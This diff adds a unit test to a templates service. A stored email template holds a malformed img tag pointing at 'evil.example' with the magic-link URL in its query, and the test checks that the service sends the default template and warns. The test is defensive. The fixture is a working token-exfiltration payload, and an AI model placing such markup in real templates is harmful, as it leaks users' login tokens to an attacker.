@@ -377,6 +377,28 @@ describe('Templates service', () => {
       expect(ctx.warn.mock.calls[0][0]).toContain('{{ url }}');
     });
 
+    it('sends the default for a stored row with a malformed tag the check would not see through', async () => {
+      // An unterminated tag: split as text here, read as an image by a browser
+      ctx.getRows().push({
+        id: 1,
+        key,
+        locale: 'en',
+        subject: 'Stored',
+        html: '<img src="https://evil.example/?t={{ url }}" <p>hi</p>',
+        text: 'Stored',
+      });
+
+      await service.sendTemplate(key, 'a@b.c', { url: 'https://app.test/magic?t=1' });
+
+      expect(ctx.send).toHaveBeenCalledWith(
+        expect.objectContaining({
+          subject: 'Default',
+          html: '<p><a href="https://app.test/magic?t=1">Go</a></p>',
+        })
+      );
+      expect(ctx.warn).toHaveBeenCalledTimes(1);
+    });
+
     it('uses a stored row that keeps its secrets in text and links, without a warning', async () => {
       await service.update(key, 'en', {
         subject: 'Stored',
